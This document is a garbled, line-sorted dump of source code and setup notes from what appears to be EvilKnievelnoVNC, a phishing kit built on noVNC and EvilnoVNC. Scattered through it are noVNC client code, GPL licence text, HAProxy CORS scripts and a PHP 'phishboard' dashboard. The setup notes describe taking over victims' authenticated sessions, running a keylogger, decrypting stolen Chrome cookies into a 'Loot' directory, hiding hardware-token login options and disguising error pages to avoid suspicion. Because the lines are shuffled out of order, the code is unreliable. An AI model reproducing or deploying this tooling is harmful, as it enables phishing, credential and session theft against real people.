"        btn.classList.add(""dis"")"
"        const B = legacyCrypto.exportKey(""raw"", dhKey.publicKey)"
"        const [currentWidth, currentHeight] = this._currentClientSize()"
"        const clientPublicKey = legacyCrypto.exportKey(""raw"", clientKey.publicKey)"
"        const controlbarBounds = document.getElementById(""noVNC_control_bar"")"
"        const cversion = ""00"" "
"        const dhKey = legacyCrypto.generateKey({ name: ""DH"", g: g, p: p }, true, [""deriveBits""])"
"        const encrypted = await legacyCrypto.encrypt({ name: ""AES-ECB"" }, cipher, credentials)"
"        const exps = document.getElementsByClassName(""noVNC_expander"")"
"        const handle = document.getElementById(""noVNC_control_bar_handle"")"
"        const jpBadKeys = [ KeyTable.XK_Zenkaku_Hankaku,"
"        const key = await legacyCrypto.digest(""MD5"", sharedKey)"
"        const key = legacyCrypto.importKey(""raw"", secret, { name: ""DES-CBC"" }, false, [""encrypt""])"
"        const llevels = ['error', 'warn', 'info', 'debug']"
"        const optn = document.createElement(""OPTION"")"
"        const password = encodeUTF8(this._rfbCredentials.password).substring(0, 63)"
"        const response = RFB.genDES(this._rfbCredentials.password, challenge)"
"        const secret = legacyCrypto.deriveBits({ name: ""DH"", public: A }, dhKey.privateKey, 64)"
"        const settingElem = document.getElementById(""noVNC_setting_"" "
"        const sversion = this._sock.rQshiftStr(12).substr(4, 7)"
"        const transitionElem = document.getElementById(""noVNC_transition_text"")"
"        const url = window.location.href.replace(""interact.php"", ""index.php"") "
"        const username = encodeUTF8(this._rfbCredentials.username).substring(0, 255)"
"        const username = encodeUTF8(this._rfbCredentials.username).substring(0, 63)"
"        ctx.clearRect(0, 0, w, h)"
"        ctx.putImageData(img, 0, 0)"
"        cursor.execute("""""""
"        data.set(RFB.messages._buildExtendedClipboardFlags([extendedClipboardActionProvide],"
"        data.set(RFB.messages._buildExtendedClipboardFlags(actions, []))"
"        data.set(deflatedData, 4)"
"        document.documentElement.classList.remove(""noVNC_connected"")"
"        document.documentElement.classList.remove(""noVNC_connecting"")"
"        document.documentElement.classList.remove(""noVNC_disconnecting"")"
"        document.documentElement.classList.remove(""noVNC_loading"")"
"        document.documentElement.classList.remove(""noVNC_reconnecting"")"
"        document.getElementById(""noVNC_approve_server_button"")"
"        document.getElementById(""noVNC_cancel_reconnect_button"")"
"        document.getElementById(""noVNC_clipboard_button"")"
"        document.getElementById(""noVNC_clipboard_clear_button"")"
"        document.getElementById(""noVNC_clipboard_text"")"
"        document.getElementById(""noVNC_connect_button"")"
"        document.getElementById(""noVNC_control_bar"")"
"        document.getElementById(""noVNC_control_bar_handle"")"
"        document.getElementById(""noVNC_credentials_button"")"
"        document.getElementById(""noVNC_disconnect_button"")"
"        document.getElementById(""noVNC_fullscreen_button"")"
"        document.getElementById(""noVNC_keyboard_button"")"
"        document.getElementById(""noVNC_keyboardinput"")"
"        document.getElementById(""noVNC_password_block"").classList.remove(""noVNC_hidden"")"
"        document.getElementById(""noVNC_power_button"")"
"        document.getElementById(""noVNC_reboot_button"")"
"        document.getElementById(""noVNC_reject_server_button"")"
"        document.getElementById(""noVNC_reset_button"")"
"        document.getElementById(""noVNC_send_ctrl_alt_del_button"")"
"        document.getElementById(""noVNC_send_esc_button"")"
"        document.getElementById(""noVNC_send_tab_button"")"
"        document.getElementById(""noVNC_settings_button"")"
"        document.getElementById(""noVNC_shutdown_button"")"
"        document.getElementById(""noVNC_status"")"
"        document.getElementById(""noVNC_toggle_alt_button"")"
"        document.getElementById(""noVNC_toggle_ctrl_button"")"
"        document.getElementById(""noVNC_toggle_extra_keys_button"")"
"        document.getElementById(""noVNC_toggle_windows_button"")"
"        document.getElementById(""noVNC_username_block"").classList.remove(""noVNC_hidden"")"
"        document.getElementById(""noVNC_view_drag_button"")"
"        document.getElementById('noVNC_clipboard_text').value = """""
"        document.getElementById('noVNC_status').classList.remove(""noVNC_open"")"
"        echo ""Error, missing parameters:"""
"        echo -e """
"        formatKeys.sort((a, b) =>  a - b)"
"        handle.style.transform = ""translateY("" "
"        hotx: 0, hoty: 0,"
"        hotx: 1, hoty: 1,"
"        if (!this._rfbTightVNC) {  // first pass, do the tunnel negotiation"
"        if ((code === ""ControlLeft"") "
"        if ((e.type == ""mousedown"") "
"        if ((e.type == ""mouseup"") "
"        if (UI.getSetting('reconnect', false) === true "
"        if (WebUtil.getConfigVar('bell', 'on') === 'on') {"
"        if (anchor.classList.contains(""noVNC_right"")) {"
"        if (btn.classList.contains(""noVNC_selected"")) {"
"        if (e.detail.types.indexOf(""password"") === -1) {"
"        if (e.detail.types.indexOf(""username"") === -1) {"
"        if (e.type === ""mousedown"") {"
"        if (reason !== """") {"
"        if (statusElem.classList.contains(""noVNC_open"")) {"
"        if (this._fbName === ""Intel(r) AMT KVM"") {"
"        if (this._rfbConnectionState !== ""connecting"" "
"        if (this._rfbConnectionState === ""connecting"" "
"        if (this._sock.rQwait(""DesktopName"", 4)) {"
"        if (this._sock.rQwait(""DesktopName"", length, 4)) {"
"        if (this._sock.rQwait(""ExtendedDesktopSize"", 4)) {"
"        if (this._sock.rQwait(""ExtendedDesktopSize"", bytes)) {"
"        if (this._sock.rQwait(""ServerCutText content"", Math.abs(length), 8)) { return false"
"        if (this._sock.rQwait(""ServerCutText header"", 7, 1)) { return false"
"        if (this._sock.rQwait(""ServerFence header"", 8, 1)) { return false"
"        if (this._sock.rQwait(""ServerFence payload"", length, 9)) { return false"
"        if (this._sock.rQwait(""VMware cursor encoding"", 1)) {"
"        if (this._sock.rQwait(""XVP version and message"", 3, 1)) { return false"
"        if (this._sock.rQwait(""auth challenge"", 16)) { return false"
"        if (this._sock.rQwait(""cursor encoding"", bytes)) {"
"        if (this._sock.rQwait(""message"", 1)) {"
"        if (this._sock.rQwait(""mslogonii dh param"", 24)) { return false"
"        if (this._sock.rQwait(""read ard keylength"", keyLength"
"        if (this._sock.rQwait(""read ard"", 4)) { return false"
"        if (this._sock.rQwait(""reason length"", 4)) {"
"        if (this._sock.rQwait(""server initialization"", 24)) { return false"
"        if (this._sock.rQwait(""sub auth capabilities"", 16 "
"        if (this._sock.rQwait(""sub auth count"", 4)) { return false"
"        if (this._sock.rQwait(""version"", 12)) {"
"        if (this._sock.rQwait('VNC auth response ', 4)) { return false"
"        if (this._sock.rQwait('server init name', nameLength, 24)) { return false"
"        if (this.classList.contains(""noVNC_open"")) {"
"        if (typeof urlOrChannel === ""string"") {"
"        if (typeof(x) === ""undefined"") { x = 0"
"        if (typeof(y) === ""undefined"") { y = 0"
"        if(file_get_contents(""https://controller/"
"        inputElemPassword.value = """""
"        kbi.value = new Array(UI.defaultKeyboardinputLen).join(""_"")"
"        let autoconnect = WebUtil.getConfigVar('autoconnect', false)"
"        let first, ret"
"        let flags = RFB.messages._buildExtendedClipboardFlags([extendedClipboardActionNotify],"
"        let flags = RFB.messages._buildExtendedClipboardFlags([extendedClipboardActionRequest],"
"        let img = new ImageData(new Uint8ClampedArray(rgba), w, h)"
"        let inputFocus = ""none"""
"        let msg = """""
"        let pos = clientToElement(ev.clientX, ev.clientY,"
"        let pos = clientToElement(ev.detail.clientX, ev.detail.clientY,"
"        let reason = """""
"        let target = document.elementFromPoint(clientX, clientY)"
"        let target = document.elementFromPoint(event.clientX, event.clientY)"
"        name = decodeUTF8(name, true)"
"        passwordBytes = legacyCrypto.encrypt({ name: ""DES-CBC"", iv: secret }, key, passwordBytes)"
"        print(f"""""""
"        return """""
"        return [this._screen.clientWidth, this._screen.clientHeight]"
"        return legacyCrypto.encrypt({ name: ""DES-ECB"" }, key, challenge)"
"        return this._display.toBlob(callback, type, quality)"
"        return this._display.toDataURL(type, encoderOptions)"
"        return this._fail(""No supported sub-auth types!"")"
"        return this._fail(""Unexpected SetColorMapEntries message"")"
"        return { w: r.width, h: r.height }"
"        rgbaPixels: new Uint8Array(),"
"        setTimeout(this._initMsg.bind(this), 0)"
"        settingElem.addEventListener('change', changeFunc)"
"        statusElem.classList.add(""noVNC_open"")"
"        table td, table th {"
"        this._canvas.addEventListener(""gestureend"", this._eventHandlers.handleGesture)"
"        this._canvas.addEventListener(""gesturemove"", this._eventHandlers.handleGesture)"
"        this._canvas.addEventListener(""gesturestart"", this._eventHandlers.handleGesture)"
"        this._canvas.addEventListener(""mousedown"", this._eventHandlers.focusCanvas)"
"        this._canvas.addEventListener(""touchstart"", this._eventHandlers.focusCanvas)"
"        this._canvas.addEventListener(""wheel"", this._eventHandlers.handleWheel)"
"        this._canvas.addEventListener('click', this._eventHandlers.handleMouse)"
"        this._canvas.addEventListener('contextmenu', this._eventHandlers.handleMouse)"
"        this._canvas.addEventListener('mousedown', this._eventHandlers.handleMouse)"
"        this._canvas.addEventListener('mousemove', this._eventHandlers.handleMouse)"
"        this._canvas.addEventListener('mouseup', this._eventHandlers.handleMouse)"
"        this._canvas.removeEventListener(""gestureend"", this._eventHandlers.handleGesture)"
"        this._canvas.removeEventListener(""gesturemove"", this._eventHandlers.handleGesture)"
"        this._canvas.removeEventListener(""gesturestart"", this._eventHandlers.handleGesture)"
"        this._canvas.removeEventListener(""mousedown"", this._eventHandlers.focusCanvas)"
"        this._canvas.removeEventListener(""touchstart"", this._eventHandlers.focusCanvas)"
"        this._canvas.removeEventListener(""wheel"", this._eventHandlers.handleWheel)"
"        this._canvas.removeEventListener('click', this._eventHandlers.handleMouse)"
"        this._canvas.removeEventListener('contextmenu', this._eventHandlers.handleMouse)"
"        this._canvas.removeEventListener('mousedown', this._eventHandlers.handleMouse)"
"        this._canvas.removeEventListener('mousemove', this._eventHandlers.handleMouse)"
"        this._canvas.removeEventListener('mouseup', this._eventHandlers.handleMouse)"
"        this._cursor.change(image.rgbaPixels,"
"        this._cursor.move(ev.detail.clientX, ev.detail.clientY)"
"        this._display.resize(this._fbWidth, this._fbHeight)"
"        this._fakeMouseMove(this._gestureFirstDoubleTapEv, pos.x, pos.y)"
"        this._fbName = """""
"        this._handleMouseButton(pos.x, pos.y, false, bmask)"
"        this._handleMouseButton(pos.x, pos.y, true, bmask)"
"        this._handleMouseMove(elementX, elementY)"
"        this._hotSpot = { x: 0, y: 0 }"
"        this._mousePos = { 'x': x, 'y': y }"
"        this._negotiateARDAuthAsync(keyLength, serverPublicKey, clientKey)"
"        this._position = { x: 0, y: 0 }"
"        this._resize(width, height)"
"        this._rfbInitState = ""SecurityResult"""
"        this._sendKeyEvent(KeyTable.XK_Control_L, ""ControlLeft"", true)"
"        this._sendKeyEvent(keysym, code, true, numlock, capslock)"
"        this._sendKeyEvent(this._keyDownList[code], code, false)"
"        this._sendMouse(this._mousePos.x, this._mousePos.y,"
"        this._sendMouse(x, y, this._mouseButtonMask)"
"        this._sock.on('close', this._socketClose.bind(this))"
"        this._sock.on('error', this._socketError.bind(this))"
"        this._sock.on('message', this._handleMessage.bind(this))"
"        this._sock.on('open', this._socketOpen.bind(this))"
"        this._sock.sQpushString(""RFB "" "
"        this._target.addEventListener('keydown', this._eventHandlers.keydown)"
"        this._target.addEventListener('keyup', this._eventHandlers.keyup)"
"        this._target.removeEventListener('keydown', this._eventHandlers.keydown)"
"        this._target.removeEventListener('keyup', this._eventHandlers.keyup)"
"        this._updateCursor(rgba, hotx, hoty, w, h)"
"        this._xvpOp(1, 2)"
"        this._xvpOp(1, 3)"
"        this._xvpOp(1, 4)"
"        this.dispatchEvent(new CustomEvent(""capabilities"","
"        this.dispatchEvent(new CustomEvent(""clippingviewport"","
"        this.onkeyevent(keysym, code, down, numlock, capslock)"
"        this.sendKey(KeyTable.XK_Alt_L, ""AltLeft"", false)"
"        this.sendKey(KeyTable.XK_Alt_L, ""AltLeft"", true)"
"        this.sendKey(KeyTable.XK_Control_L, ""ControlLeft"", false)"
"        this.sendKey(KeyTable.XK_Control_L, ""ControlLeft"", true)"
"        this.sendKey(KeyTable.XK_Delete, ""Delete"", false)"
"        this.sendKey(KeyTable.XK_Delete, ""Delete"", true)"
"        this.sendKey(keysym, code, down)"
"        usernameBytes = legacyCrypto.encrypt({ name: ""DES-CBC"", iv: secret }, key, usernameBytes)"
"        w: 0, h: 0,"
"        w: 3, h: 3,"
"        window.addEventListener('blur', this._eventHandlers.blur)"
"        window.addEventListener('fullscreenchange', UI.updateFullscreenButton)"
"        window.addEventListener('mozfullscreenchange', UI.updateFullscreenButton)"
"        window.addEventListener('msfullscreenchange', UI.updateFullscreenButton)"
"        window.addEventListener('resize', UI.updateControlbarHandle)"
"        window.addEventListener('webkitfullscreenchange', UI.updateFullscreenButton)"
"        window.removeEventListener('blur', this._eventHandlers.blur)"
"        xhr.open(""GET"", url)"
"      ""js"": [""content.js""],"
"      ""matches"": ["
"      pattern = ""//"" .. pattern"
"      pattern = pattern:gsub(""[:]"
"      preflight_request_ver1(txn, allowed_methods, allowed_headers)"
"      reply:add_header(""Vary"", ""Accept-Encoding,Origin"")"
"      txn.http:res_add_header(""Vary"", ""Accept-Encoding,Origin"")"
"    """"""Return a "
"    ""cookies"","
"    ""experimental"""
"    ""keep intact all notices""."
"    'pylogger_file',"
"    (including a physical distribution medium), accompanied by a"
"    (including a physical distribution medium), accompanied by the"
"    -- if there is no scheme and the pattern does not begin with a dot, "
"    // (i.e. are we over the target, or a child of the target without a"
"    // Add a call to save settings when the element changes,"
"    // Mouse events might be emulated, this allows"
"    // Set the new value, update and disable form control setting"
"    // Update cookie and form control setting. If value is not set, then"
"    // Update state of clipping in Display object, and make sure the"
"    // VeNCrypt authentication, currently only supports version 0.2 and only Plain subtype"
"    // When normal keyboard events are left uncought, use the input events from"
"    // reason, e.g. waiting for a password from the user"
"    //document.body.innerHTML = ""<br /><center><p>blocked</p></center>"""
"    <meta charset=""utf-8"">"
"    Corresponding Source, you remain obligated to ensure that it is"
"    FROM cookies"""""")"
"    License will therefore apply, along with any applicable section 7"
"    QEMUExtendedKeyEvent(sock, keysym, down, keycode) {"
"    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value "
"    This is free software, and you are welcome to redistribute it"
"    This program is distributed in the hope that it will be useful,"
"    [""<all_urls>""]"
"    _buildExtendedClipboardFlags(actions, formats) {"
"    _fakeMouseMove(ev, elementX, elementY) {"
"    _handleKeyEvent(keysym, code, down) {"
"    _handleMouseButton(x, y, down, bmask) {"
"    _handleMouseMove(x, y) {"
"    _handleTapEvent(ev, bmask) {"
"    _resize(width, height) {"
"    _sendKeyEvent(keysym, code, down, numlock = null, capslock = null) {"
"    _sendMouse(x, y, mask) {"
"    _setCapability(cap, val) {"
"    _updateCursor(rgba, hotx, hoty, w, h) {"
"    _xvpOp(ver, op) {"
"    a) Convey the object code in, or embodied in, a physical product"
"    addOption(selectbox, text, value) {"
"    addSettingChangeHandler(name, changeFunc) {"
"    additional terms, to the whole of the work, and all its parts,"
"    along with this program.  If not, see <https://www.gnu.org/licenses/>."
"    alternative is allowed only occasionally and noncommercially, and"
"    async _negotiateARDAuthAsync(keyLength, serverPublicKey, clientKey) {"
"    b) Convey the object code in, or embodied in, a physical product"
"    c) Prohibiting misrepresentation of the origin of that material, or"
"    c) You must license the entire work, as a whole, under this"
"    change(rgba, hotx, hoty, w, h) {"
"    cipher = AES.new(key, AES.MODE_CBC, iv)"
"    clientCutText(sock, data, extended = false) {"
"    clientEncodings(sock, encodings) {"
"    clientFence(sock, flags, payload) {"
"    closeControlbarTimeout: null,"
"    connect(event, password) {"
"    connected: false,"
"    constructor(target, urlOrChannel, options) {"
"    controlbarDrag: false,"
"    controlbarGrabbed: false,"
"    controlbarMouseDownClientY: 0,"
"    controlbarMouseDownOffsetY: 0,"
"    conveying of source, or (2) access to copy the"
"    copy the object code is a network server, the Corresponding Source"
"    core.Debug(""CORS: "" .. origin .. "" allowed"")"
"    core.Debug(""CORS: "" .. origin .. "" not allowed"")"
"    core.Debug(""CORS: Got 'Origin' header: "" .. headers[""origin""][0])"
"    cursor.execute("""""""
"    d) If the work has interactive user interfaces, each must display"
"    db.text_factory = lambda b: b.decode(errors=""ignore"")"
"    defaultKeyboardinputLen: 100,"
"    desktopName: """","
"    document.body.prepend(Object.assign(document.createElement('h1'),{innerHTML:""Testing!""}))"
"    e) Convey the object code using peer-to-peer transmission, provided"
"    echo ""user:false"" "
"    enableContinuousUpdates(sock, enable, x, y, width, height) {"
"    extendedClipboardCaps(sock, actions, formats) {"
"    extendedClipboardNotify(sock, formats) {"
"    extendedClipboardProvide(sock, formats, inData) {"
"    extendedClipboardRequest(sock, formats) {"
"    fbUpdateRequest(sock, incremental, x, y, w, h) {"
"    filename = ""/home/user/Chrome/Default/Cookies"""
"    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():"
"    for index, allowed_origin in ipairs(allowed_origins) do"
"    forceSetting(name, val) {"
"    hideKeyboardTimeout: null,"
"    idleControlbarTimeout: null,"
"    if method == ""OPTIONS"" and txn.reply == nil then"
"    if string.find(pattern, ""[:]"
"    inhibitReconnect: true,"
"    initSetting(name, defVal) {"
"    interfaces that do not display Appropriate Legal Notices, your"
"    it) with contractual assumptions of liability to the recipient, for"
"    it, and giving a relevant date."
"    key = PBKDF2(my_pass, salt, length, iterations)"
"    keyEvent(keysym, code, down) {"
"    keyEvent(sock, keysym, down) {"
"    lastKeyboardinput: null,"
"    medium customarily used for software interchange, for a price no"
"    model, to give anyone who possesses the object code either (1) a"
"    move(clientX, clientY) {"
"    only if you received the object code with such an offer, in accord"
"    origin = headers[""origin""][0]"
"    pattern = pattern .. ""$"""
"    pattern = pattern:gsub(""([%.%-])"", ""%%%1"")"
"    permission to license the work in any other way, but it does not"
"    pixelFormat(sock, depth, trueColor) {"
"    place (gratis or for a charge), and offer equivalent access to the"
"    pointerEvent(sock, x, y, mask) {"
"    preflight_request_ver2(txn, origin, allowed_methods, allowed_origins, allowed_headers)"
"    product that is covered by this License, on a durable physical"
"    reconnectCallback: null,"
"    reconnectPassword: null,"
"    reply:add_header(""Access-Control-Allow-Origin"", allowed_origin)"
"    return """
"    sendKey(keysym, code, down) {"
"    set touchButton(button) { Log.Warn(""Using old API!"")"
"    setDesktopSize(sock, width, height, id, flags) {"
"    showStatus(text, statusType, time) {"
"    static genDES(password, challenge) {"
"    statusTimeout: null,"
"    that supports equivalent copying facilities, provided you maintain"
"    the Free Software Foundation, either version 3 of the License, or"
"    toBlob(callback, type, quality) {"
"    toDataURL(type, encoderOptions) {"
"    trade names, trademarks, or service marks"
"    txn.http:res_set_header(""Access-Control-Allow-Origin"", allowed_origin)"
"    with open(log_file, 'a') as f:"
"    written offer, valid for at least three years and valid for as"
"    xvpOp(sock, ver, op) {"
"    },"
"  ""Additional permissions"" are terms that supplement the terms of this"
"  ""Copyright"" also means copyright-like laws that apply to other kinds of"
"  ""Installation Information"" for a User Product means any methods,"
"  ""The Program"" refers to any copyrightable work licensed under this"
"  ""This License"" refers to version 3 of the GNU General Public License."
"  ""content_scripts"": ["
"  ""host_permissions"":"
"  ""permissions"": ["
"  -- for example, it may be a regular OPTIONS request that is not a CORS preflight request"
"  A ""Standard Interface"" means an interface that either is an official"
"  A ""User Product"" is either (1) a ""consumer product"", which means any"
"  A ""contributor"" is a copyright holder who authorizes use under this"
"  A ""covered work"" means either the unmodified Program or a work based"
"  A contributor's ""essential patent claims"" are all patent claims"
"  A patent license is ""discriminatory"" if it does not include within"
"  A separable portion of the object code, whose source code is excluded"
"  Additional terms, permissive or non-permissive, may be stated in the"
"  All other non-permissive additional terms are considered ""further"
"  An ""entity transaction"" is a transaction transferring control of an"
"  An interactive user interface displays ""Appropriate Legal Notices"""
"  Caps handling done, send caps with the clients"
"  Corresponding Source conveyed, and Installation Information provided,"
"  Each contributor grants you a non-exclusive, worldwide, royalty-free"
"  Each time you convey a covered work, the recipient automatically"
"  Finally, every program is threatened constantly by software patents."
"  For example, if you distribute copies of such a program, whether"
"  For the developers' and authors' protection, the GPL clearly explains"
"  However, if you cease all violation of this License, then your"
"  If conditions are imposed on you (whether by court order, agreement or"
"  If the program does terminal interaction, make it output a short"
"  If you add terms to a covered work in accord with this section, you"
"  If you convey a covered work, knowingly relying on a patent license,"
"  If you convey an object code work under this section in, or with, or"
"  If you develop a new program, and you want it to be of the greatest"
"  If, pursuant to or in connection with a single transaction or"
"  In the following three paragraphs, a ""patent license"" is any express"
"  Moreover, your license from a particular copyright holder is"
"  Notwithstanding any other provision of this License, for material you"
"  Notwithstanding any other provision of this License, you have"
"  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY"
"  The ""Corresponding Source"" for a work in object code form means all"
"  The ""System Libraries"" of an executable work include anything, other"
"  The ""source code"" for a work means the preferred form of the work"
"  The GNU General Public License is a free, copyleft license for"
"  The precise terms and conditions for copying, distribution and"
"  To ""convey"" a work means any kind of propagation that enables other"
"  To ""modify"" a work means to copy from or adapt all or part of the work"
"  To ""propagate"" a work means to do anything with it that, without"
"  To do so, attach the following notices to the program.  It is safest"
"  To protect your rights, we need to prevent others from denying you"
"  When we speak of free software, we are referring to freedom, not"
"  When you convey a copy of a covered work, you may at your option"
"  When you convey a covered work, you waive any legal power to forbid"
"  You may charge any price or no price for each copy that you convey,"
"  You may convey a work based on the Program, or the modifications to"
"  You may make, run and propagate covered works that you do not"
"  You should also get your employer (if you work as a programmer) or school,"
"  ],"
"  core.Debug(""CORS: Returning reply to preflight request"")"
"  core.Debug(""CORS: attaching allowed methods to response"")"
"  core.Debug(""CORS: preflight request received"")"
"  for _,item in pairs(items) do"
"  if contains(allowed_origins, """
"  if headers[""origin""] "
"  if method == ""OPTIONS"" and txn.reply "
"  local allowed_headers = transaction_data[""allowed_headers""]"
"  local allowed_methods = transaction_data[""allowed_methods""]"
"  local allowed_origin = M.get_allowed_origin(origin, allowed_origins)"
"  local allowed_origins = core.tokenize(allowed_origins, "","")"
"  local allowed_origins = transaction_data[""allowed_origins""]"
"  local method = transaction_data[""method""]"
"  local origin = transaction_data[""origin""]"
"  match = ''.concat(document.location.href, window.location.hash).match(re)"
"  reply:add_header(""Access-Control-Allow-Headers"", allowed_headers)"
"  reply:add_header(""Access-Control-Allow-Methods"", allowed_methods)"
"  reply:add_header(""Access-Control-Max-Age"", 600)"
"  reply:add_header(""Content-Type"", ""text/html"")"
"  reply:set_status(204, ""No Content"")"
"  return s:gsub(""%s"
"  return string.find(s, """
"  transaction_data[""allowed_headers""] = allowed_headers"
"  transaction_data[""allowed_methods""] = allowed_methods"
"  transaction_data[""allowed_origins""] = allowed_origins"
"  transaction_data[""method""] = method"
"  transaction_data[""origin""] = origin"
"  txn.http:res_set_header(""Access-Control-Allow-Headers"", allowed_headers)"
"  txn.http:res_set_header(""Access-Control-Allow-Methods"", allowed_methods)"
"  txn.http:res_set_header(""Access-Control-Max-Age"", 600)"
" !isset($_GET[""cmd""])) {"
" "" "" "
" "" (version "" "
" "" - "" "
" "" -> "" "
" "" given."")"
" ""'"")"
" ""', ignoring"")"
" ""', was '"" "
" ""'."")"
" "") in fence response"")"
" "")"")"
" ""): "" "
" ""): keysym "" "
" "", capslock: "" "
" "", depth: "" "
" "", scancode "" "
" ""."" "
" ""..."")"
" ""="" "
" ""blocked"" : """") . ""'>"" . $t[""userid""] . ""</td>"" . PHP_EOL"
" ""blocked"" : """") . ""'><abbr title='"" . $t[""inputs""] . ""'>"" . $t[""userid""] . ""</abbr></td>"" . PHP_EOL"
" ""down"" : ""up"") "
" ""logsubmit"
" ""no"" : ""yes"") . ""</td>"""
" ""noVNC_password_input"" : inputFocus"
" ""noVNC_username_input"" : inputFocus"
" ""px"""
" ""px)"""
" ""success"")"
" ""x"" "
" ""x24"""
" $_GET[""block""] === ""1"" "
" $_GET[""reset""] === ""1"" "
" $admin[5] === ""2"") $color = """
" $admin[5] === ""2"") $disabled = """""
" $disabled === """") {"
" $s[""blocked""] == 0) {"
" $s[""state""] < 1) {"
" $s[""state""] < 3"
" $s[""state""] < 3) { // state < 3 should not happen (blacklist!)"
" $s[""state""] === 3) {"
" (echo ""[!] Missing argument"""
" (echo ""[!] Missing dependency: screen"" "
" (event.key === ""v"" "
" // check every x milliseconds, for dynamic sites"
" // echo statt cat, nur resolution.txt"
" /bin/bash -c ""/home/user/kiosk.sh"" "
" /usr/bin/chromium-browser ""$URL"" "
" 0xFF,"
" 1003 on Mac, 1 on Linux"
" 2, 2)) {"
" 4), 2)) {"
" </h2><div id=""challenge-stage"" style=""display:none""></div><div id=""challenge-spinner"" class=""spacer loading-spinner"" style=""display:block"
" <div class=""main-content"">"
" <div class=""main-wrapper"" role=""main"">"
" <div id=challenge-body-text class=""core-msg spacer"">"
" <form id=challenge-form action=""/"
" <h1 class=""zone-name-title h1"">"
" <h2 class=""h2"" id=""challenge-running"">"
" <noscript class=""sf-hidden"">"
" Chrome, Edge, and Safari "
" Clear Logs"" />"
" Clear Loot Dir"" />"
" Clear Targets"" />"
" Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>"
" File does not exist, or no permissions."
" If so, then we must use the"
" On Linux, replace MY_PASS with 'peanuts'"
" On Mac, replace MY_PASS with your password from Keychain"
" Remove all unused containers, networks, images (both dangling and unused), and optionally, volumes."
" SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value"
" Today, botnets take over millions of devices at once.</span></div><div id=challenge-explainer-expandable class=""hidden expandable body-text spacer"" style=display:none> </div><div id=challenge-success style=display:none></div>"
" WHERE host_key like '%thepythoncode.com%'"""""")"
" adjust error messages, e.g. haproxy/503.http"
" after setup, run EvilKnievelnoVNC components"
" as KeyboardUtil from ""./util.js"""
" as WebUtil from ""./webutil.js"""
" as browser from ""../util/browser.js"""
" auto block users after successful authentication, presenting a custom message/page"
" block user if a specific (session) cookie pops up (halfway implemented, see EvilnoVNC/Files/content.js)"
" chmod 777 $dir'"")"
" concurrent [EvilnoVNC](https://github.com/JoelGMSec/EvilnoVNC) instances, as many as your server can handle"
" configure victims in the dashboard via ""Manage Targets"""
" consider adapting error messages to impede suspision (haproxy/503.http), e.g. in the design of the target site"
" consider adjusting timezone info in config files (grep), the default is Europe/Berlin"
" cursor.execute("""""""
" cut -d ""="" -f 2)"
" cut -d""."" -f2)"
" define admin interface credentials, change the password!"
" define custom port for victims, e.g. for testing, sUrl will be adjusted accordingly"
" docker, bash and realpath required as basic dependencies, screen/byobu/lazydocker is recommended"
" document.readyState === ""complete"") {"
" done"" "
" dont block access if is_admin, reqid in whitelist, accessing js and specific paths"
" e.detail.text.substr(0, 40) "
" e.g. start.sh dynamic ""https://example.com"" 02"
" echo ""EvilnoVNC/tmp/"
" echo ""Loot/"
" echo ""accesslog.txt"""
" echo ""blacklist.acl"""
" echo ""submitlog.txt"""
" echo ""targets.json"""
" echo ""whitelist.acl"""
" echo -n '' > /etc/submitlog.txt"")"
" event.key === ""V"")) {"
" expires="" "
" expires=Thu, 01 Jan 1970 00:00:00 UTC"
" for a GUI interface, you would use an ""about box""."
" for each server in novnc backend, there is a separate backend with a single server pointing to the same system for admin access to overtake active victim sessions"
" grep ""</title>"" "
" grep ""<title>"" "
" grep 'x24' > "" . $f2)"
" grep evil"")"
" grep novnc"")"
" grep novnc/s$svrno"")"
" head -n 1"")"
" however, if the Program has interactive"
" i < Math.min(oldLen, newLen)"
" i=""0$i"""
" if timezone is different than Europe/Berlin, grep/sed through the files and adjust to your needs "
" is formatted as the number of microseconds since January, 1601"""""""
" isset($_GET[""reqid""])) {"
" isset($_GET[""svr""])) {                                                                                                                                                                   "
" isset($_GET[""svr""])) {"
" isset($_POST[""targets""])) {"
" keylog, decrypted cookies, Chromium profile and downloads are put in the central Loot directory (docker volume)"
" keysym, "", code: "" "
" manipulate target site via Chromium extension, e.g. hide alternative login methods such as hardware token, or perform any action in the name of the victim"
" mkdir /home/user/Downloads/Default"" "
" nc hap 8000"")"
" numTunnels, 4)) { return false"
" of this license document, but changing it is not allowed."
" parseInt(this._rfbVersion, 10) "
" place your own TLS certificate, define location in setup.sh"
" prevent access from bots (user-agent contains ""bot"" case insensitive)"
" react on victim's actions: view session, overtake (authenticated) session or reset session"
" request.statusText, request.responseText)"
" running as user ""user"" not root!"
" sUrl=""$sUrl/"""
" sUrl=""$sUrl:$victimPort/"" "
" script in controller/, haproxy/, EvilnoVNC/. Control via lazydocker"
" security by <a rel=""noopener noreferrer"" href=""https://www.cloudflare.com/"
" sed ""s/<["
" sed -i ""4s/."
" start chromium with target URL, sleep: wait for resolution to be read and stored to disk"
" start.sh dynamic ""url"" instance-id"
" strlen($sid) < 2) $sid = ""0"" . $sid"
" strlen($svrno) < 2) $svrno = ""0"" . $svrno"
" subAuthCount, 4)) { return false"
" sudo pip3 install pyxhook pycryptodome"" "
" sudo python3 /home/user/keylogger.py 2> log.txt"" "
" sudo python3 keylogger.py 2>> errorlog.txt"" "
" sudo sed -i ""s"
" sudo sed -i ""s/--window-size=[0-9]"
" sudo sed -i ""s/1280,720/${arr[0]},${arr[1]}/"" /etc/chromium/chromium.conf"
" text.substr(0, 40) "
" there is no guarantee for anything, check the code and test it before usage"
" there needs to be another server container running, else haproxy would fail starting up..."
" this._sock.rQwait(""tunnel capabilities"", 16 "
" with some adjustments, it can be placed in the path of the URL as well"
" x=""0$x"""
" you can also search by domain, e.g thepythoncode.com"
" { echo ""[!] bash missing as dependency, exiting"""
" { echo ""[!] docker missing as dependency, exiting"""
" { echo ""[!] realpath missing as dependency, exiting"""
" } // View only, skip mouse events"
""" $dash1"
""" $dash2"
""" $erun"
""" $hrun"
""" $run"
""" />"
""" /etc/chromium/chromium.conf"
""" 01"""
""" > /dev/null 2>"
""" then"
""""" . $aUrl . ""phishboard/interact.php"
""""" . $reqid . """
""""" . $sid . """
""""" . $svrno . """
""""""", (decrypted_value, host_key, name))"
""""", """", $_GET[""v""])"
""""", ""foo""]"
"""%Y%m%d-%H%M%S"")"
""") then"
